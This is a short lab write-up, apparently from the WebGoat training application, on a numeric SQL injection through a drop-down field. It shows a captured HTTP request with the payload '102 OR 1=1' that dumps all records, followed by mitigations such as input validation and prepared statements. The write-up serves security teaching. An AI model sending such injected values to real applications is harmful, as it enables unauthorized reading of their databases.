
## Vulnerability:

This time integer data type is supplied to sql query via drop down menu.

## Exploitation:

Modified request in ZAP that exploits this vulnerability:

```
POST http://webgoat.hacking-lab.com/attack?Screen=77&menu=1100 HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 33
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://webgoat.hacking-lab.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/39.0.2171.65 Chrome/39.0.2171.65 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://webgoat.hacking-lab.com/attack?Screen=77&menu=1100
Accept-Language: en-US,en;q=0.8
Cookie: JSESSIONID=DD06788BDCB1B5813FA6CDC51452FF6E
Cookie: $Version=0; JSESSIONID=A93334E44AE5E96915FD28AA47049A61; $Path=/
Host: webgoat.hacking-lab.com
Cookie: $Version=0; JSESSIONID=A93334E44AE5E96915FD28AA47049A61; $Path=/

station=102+OR+1%3D1&SUBMIT=Go%21
```

It retrieves all DB records.

## Mitigation:
1) validate input data

2) use prepared statements/stored procedures (https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet) 
